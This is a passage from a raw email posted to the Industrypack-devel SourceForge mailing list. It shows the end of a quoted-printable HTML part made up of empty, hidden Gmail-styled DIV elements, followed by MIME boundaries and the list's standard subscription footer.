V> <DIV class=3D"vY nq" style=3D"FONT-SIZE: medium; HEIGHT: 673px; FON=
T-FAMILY: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-s=
erif; WIDTH: 1280px; WHITE-SPACE: normal; WORD-SPACING: 0px; POSITION:=
 absolute; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,33,36=
); FONT-STYLE: normal; LEFT: 0px; ORPHANS: 2; WIDOWS: 2; Z-INDEX: -2; =
LETTER-SPACING: normal; TOP: 0px; VISIBILITY: hidden; TEXT-INDENT: 0px=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
ext-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
tion-style: initial; text-decoration-color: initial"></DIV> <DIV class=
=3D"dw np" style=3D"FONT-SIZE: medium; OVERFLOW: hidden; HEIGHT: 673px=
; FONT-FAMILY: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, s=
ans-serif; WIDTH: 1280px; WHITE-SPACE: normal; WORD-SPACING: 0px; POSI=
TION: absolute; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,=
33,36); FONT-STYLE: normal; LEFT: 0px; ORPHANS: 2; WIDOWS: 2; Z-INDEX:=
 -1; LETTER-SPACING: normal; TOP: 0px; VISIBILITY: hidden; TEXT-INDENT=
: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -web=
kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-d=
ecoration-style: initial; text-decoration-color: initial"> <DIV> <DIV =
class=3DnH style=3D"WIDTH: 1280px"> <DIV class=3D"nH VL" style=3D"HEIG=
HT: 673px"> <DIV class=3Dno style=3D"FLOAT: right; DISPLAY: flex; flex=
-direction: row-reverse; -webkit-box-orient: horizontal; -webkit-box-d=
irection: reverse"> <DIV class=3D"nH nn" style=3D"WIDTH: 56px; FLOAT: =
left; MIN-HEIGHT: 1px; order: 2147483647"></DIV> <DIV class=3D"nH nn" =
style=3D"WIDTH: 66px; FLOAT: left; MIN-HEIGHT: 1px; order: 0"></DIV></=
DIV> <DIV class=3DdJ style=3D"OVERFLOW: hidden; HEIGHT: 0px; CLEAR: bo=
th"></DIV></DIV></DIV></DIV></DIV> <DIV role=3Dtooltip class=3D"T-ays =
T-ays-avH" style=3D"CURSOR: default; BORDER-TOP: transparent 10px soli=
d; FONT-FAMILY: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, =
sans-serif; BORDER-RIGHT: transparent 0px solid; BACKGROUND: none tran=
sparent scroll repeat 0% 0%; WHITE-SPACE: pre-wrap; WORD-SPACING: 0px;=
 BORDER-BOTTOM: transparent 10px solid; POSITION: absolute; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 500; COLOR: rgb(255,255,255); PADDING-BOTTOM:=
 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-=
LEFT: -1px; LEFT: 277px; BORDER-LEFT: transparent 0px solid; ORPHANS: =
2; WIDOWS: 2; Z-INDEX: 30000; DISPLAY: block; LETTER-SPACING: normal; =
LINE-HEIGHT: 16px; TOP: 99px; PADDING-RIGHT: 0px; VISIBILITY: hidden; =
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial; text-decoration-color: initial; b=
order-radius: 0px; border-image: initial; pointer-events: none; transi=
tion: opacity 75ms, left 75ms, top 75ms, visibility 75ms; box-shadow: =
none; opacity: 0; -webkit-font-smoothing: antialiased"> <DIV class=3DT=
-ays-iP style=3D"BACKGROUND: rgb(60,64,67); PADDING-BOTTOM: 4px; PADDI=
NG-TOP: 4px; PADDING-LEFT: 8px; PADDING-RIGHT: 8px; border-radius: 4px=
"></DIV></DIV><BR class=3DApple-interchange-newline><BR></body>
 </html>

--zGgnYEEYCq1VkPIjDWt4lpw=_rCSdEYUoA--



--===============0421363540326429945==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0421363540326429945==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0421363540326429945==--


